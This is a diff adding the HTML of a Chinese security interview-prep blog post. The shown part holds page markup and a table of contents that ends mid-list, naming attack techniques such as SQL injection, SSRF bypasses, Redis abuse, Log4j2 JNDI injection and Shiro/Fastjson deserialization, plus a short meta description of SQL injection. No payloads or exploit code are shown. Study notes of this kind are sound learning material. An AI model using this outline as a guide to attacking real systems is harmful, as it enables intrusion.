@@ -1,0 +1,1647 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    面经 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Web  SQL注入原理 未对用户的输入进行检验过滤，未进行预编译，或者处理的不完整，处理程序不完善，导致可以将恶意代码插入数据库查询语句中，造成SQL注入 联合注入：通过union select将额外的查询条件注入到原始的查询语句中，从而获取数据库中的信息 **布尔盲注：**由于页面无结果回显，只能依据页面回显变化（例如页面内容、状态码或响应时间）利用布尔条件（真&#x2F;假）来逐位或逐字符猜解数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面经">
+<meta property="og:url" content="http://example.com/2026/01/06/%E9%9D%A2%E7%BB%8F/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Web  SQL注入原理 未对用户的输入进行检验过滤，未进行预编译，或者处理的不完整，处理程序不完善，导致可以将恶意代码插入数据库查询语句中，造成SQL注入 联合注入：通过union select将额外的查询条件注入到原始的查询语句中，从而获取数据库中的信息 **布尔盲注：**由于页面无结果回显，只能依据页面回显变化（例如页面内容、状态码或响应时间）利用布尔条件（真&#x2F;假）来逐位或逐字符猜解数据">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/01/06/images/image-20260107125126085.png">
+<meta property="og:image" content="http://example.com/2026/01/06/images/image-20260107150850688.png">
+<meta property="article:published_time" content="2026-01-06T15:36:03.000Z">
+<meta property="article:modified_time" content="2026-03-04T06:50:37.348Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="面经">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/01/06/images/image-20260107125126085.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="面经">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">面经</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text"> SQL注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text"> UDF提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> MOF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E5%86%99shell%E5%A6%82%E6%9E%9C%E4%B8%8D%E7%9F%A5%E9%81%93%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E7%BD%91%E7%AB%99%E8%B7%AF-%E5%BE%84"><span class="toc-number">1.4.</span> <span class="toc-text"> mysql写shell，如果不知道⽹站绝对路径，我们通过什么⽅式可以知道⽹站路 径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%AF%AD%E5%8F%A5%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.5.</span> <span class="toc-text"> SQL注⼊判断数据库类型的语句是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A550-%E4%BB%A5%E4%B8%8A%E5%92%8C-50-%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">1.6.</span> <span class="toc-text"> MySQL 的网站注入，5.0 以上和 5.0 以下有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text"> SQL 注入过滤了逗号，怎么处理？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%E6%97%B6%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.8.</span> <span class="toc-text"> SQL 注入存在时，怎么判断是什么数据库？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text"> 文件上传原理&#x2F;绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess"><span class="toc-number">1.9.1.</span> <span class="toc-text"> .htaccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#userini"><span class="toc-number">1.9.2.</span> <span class="toc-text"> .user.ini</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E5%92%8Ccsrf%E5%92%8Cxss%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%8C%BA%E5%88%AB"><span class="toc-number">1.10.</span> <span class="toc-text"> ssrf和csrf和xss的原理和区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E5%92%8Ccsrf%E5%92%8Cxss%E7%9A%84%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.11.</span> <span class="toc-text"> ssrf和csrf和xss的防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.12.</span> <span class="toc-text"> ssrf的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E4%B8%80%E8%88%AC%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.13.</span> <span class="toc-text"> ssrf⼀般常⽤的伪协议有哪些？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E7%A6%81%E7%94%A8-127001-%E5%90%8E%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.14.</span> <span class="toc-text"> SSRF 禁⽤ 127.0.0.1 后如何绕过，⽀持哪些协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4"><span class="toc-number">1.15.</span> <span class="toc-text"> CSRF 漏洞如何防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%A9%E7%94%A8redis%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.16.</span> <span class="toc-text"> Redis未授权利用&#x2F;redis提权利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">1.17.</span> <span class="toc-text"> Redis未授权的防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86"><span class="toc-number">1.18.</span> <span class="toc-text"> Redis主从复制原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">1.19.</span> <span class="toc-text"> XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.20.</span> <span class="toc-text"> XXE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crlf%E4%BA%86%E8%A7%A3%E5%90%97-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.21.</span> <span class="toc-text"> crlf了解吗、怎么绕过？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.22.</span> <span class="toc-text"> 同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.23.</span> <span class="toc-text"> web中间件常见漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.24.</span> <span class="toc-text"> 常⻅的中间件解析漏洞有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.25.</span> <span class="toc-text"> 常见的逻辑漏洞的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.26.</span> <span class="toc-text"> pickle反序列化原理&#x2F;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">1.27.</span> <span class="toc-text"> php反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E5%87%A0%E4%B8%AAphp%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.28.</span> <span class="toc-text"> 说⼏个php⾥⾯可以执⾏命令的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B8%B8%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.29.</span> <span class="toc-text"> php反序列化常用原生类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3"><span class="toc-number">1.30.</span> <span class="toc-text"> Thinkphp漏洞理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce%E8%BF%87%E6%BB%A4%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%BE%8B%E5%A6%82flag%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">1.31.</span> <span class="toc-text"> rce过滤特定字符，例如flag该怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.32.</span> <span class="toc-text"> JS原型链污染漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.33.</span> <span class="toc-text"> JWT漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ld_preload%E5%8A%AB%E6%8C%81"><span class="toc-number">1.34.</span> <span class="toc-text"> LD_PRELOAD劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable_functions%E7%BB%95%E8%BF%87"><span class="toc-number">1.35.</span> <span class="toc-text"> disable_functions绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open_basedir%E7%BB%95%E8%BF%87"><span class="toc-number">1.36.</span> <span class="toc-text"> open_basedir绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.37.</span> <span class="toc-text"> Session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%98%B2%E5%BE%A1"><span class="toc-number">1.38.</span> <span class="toc-text"> 文件包含防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9Fjsonp-%E4%B8%8E-cors-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.39.</span> <span class="toc-text"> 跨域；Jsonp 与 Cors 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%AD%E7%9A%84%E5%90%8C%E6%BA%90%E6%9D%A1%E4%BB%B6%E4%BD%9C%E7%94%A8%E4%B8%8E%E9%99%90%E5%88%B6"><span class="toc-number">1.40.</span> <span class="toc-text"> 同源策略中的同源条件；作用与限制？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javasec"><span class="toc-number">2.</span> <span class="toc-text"> Javasec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%8F%8D%E5%B0%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text"> java反射原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E7%9A%84%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> java的双亲委派机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text"> java类的动态加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text"> JDK高版本限制&amp;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3jackson%E9%93%BE%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="toc-number">2.5.</span> <span class="toc-text"> 解决jackson链的不稳定性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk"><span class="toc-number">2.6.</span> <span class="toc-text"> JNDI注入绕过高版本JDK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">2.7.</span> <span class="toc-text"> java命令执行方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%BC%A0%E7%BB%9F%E5%8F%8D%E5%B0%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.8.</span> <span class="toc-text"> 绕过传统反射黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.9.</span> <span class="toc-text"> JNDI注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.10.</span> <span class="toc-text"> RMI工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi-jndi-%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.11.</span> <span class="toc-text"> RMI-JNDI 的原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi-jndi-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%A4%A7%E6%A6%82%E8%AF%B4%E4%B8%80%E4%B8%8B%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">2.12.</span> <span class="toc-text"> RMI-JNDI 注入流程大概说一下？（含原理）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap-jndi-%E6%B3%A8%E5%85%A5%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">2.13.</span> <span class="toc-text"> LDAP-JNDI 注入是什么？（含攻击链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi-jndi-%E5%92%8C-ldap-jndi-%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.14.</span> <span class="toc-text"> RMI-JNDI 和 LDAP-JNDI 的主要区别是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.15.</span> <span class="toc-text"> log4j漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-log4j2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">2.16.</span> <span class="toc-text"> Apache Log4j2 远程代码执行的攻击流程是什么？（含攻击链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E5%B8%B8%E5%A6%82%E4%BD%95%E5%B0%86-payload-%E6%B3%A8%E5%85%A5%E5%88%B0-log4j2"><span class="toc-number">2.17.</span> <span class="toc-text"> 攻击者通常如何将 payload 注入到 Log4j2？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-log4j2-jndi-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.18.</span> <span class="toc-text"> 如何防御 Log4j2 JNDI 注入漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1224-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.19.</span> <span class="toc-text"> Fastjson1.2.24 漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1247-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.20.</span> <span class="toc-text"> Fastjson1.2.47 漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-fastjson-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.21.</span> <span class="toc-text"> 如何判断是否存在 Fastjson 漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-%E6%9C%89%E5%87%A0%E7%A7%8D%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.22.</span> <span class="toc-text"> Shiro 有几种漏洞类型？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-shiro-%E6%BC%8F%E6%B4%9E%E5%90%AB-shiro-%E6%A1%86%E6%9E%B6%E7%89%B9%E5%BE%81"><span class="toc-number">2.23.</span> <span class="toc-text"> 如何判断是否存在 Shiro 漏洞？（含 Shiro 框架特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.24.</span> <span class="toc-text"> Apache Shiro550 反序列化漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-shiro721-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.25.</span> <span class="toc-text"> Apache Shiro721 反序列化漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoerial%E4%B8%ADcc%E9%93%BE%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E6%89%93shiro"><span class="toc-number">2.26.</span> <span class="toc-text"> ysoerial中CC链为什么不能打Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D-fastjson-%E5%92%8C-shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.27.</span> <span class="toc-text"> 如何修复 Fastjson 和 Shiro 反序列化漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.28.</span> <span class="toc-text"> JDBC-mysql反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADstruts%E6%A1%86%E6%9E%B6"><span class="toc-number">2.29.</span> <span class="toc-text"> 判断Struts框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.30.</span> <span class="toc-text"> Struts2 远程代码执行漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.30.0.1.</span> <span class="toc-text"> 核心原理步骤：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.31.</span> <span class="toc-text"> Weblogic框架漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.32.</span> <span class="toc-text"> SnakeYaml反序列化原理</span></a></li><li class="toc-item 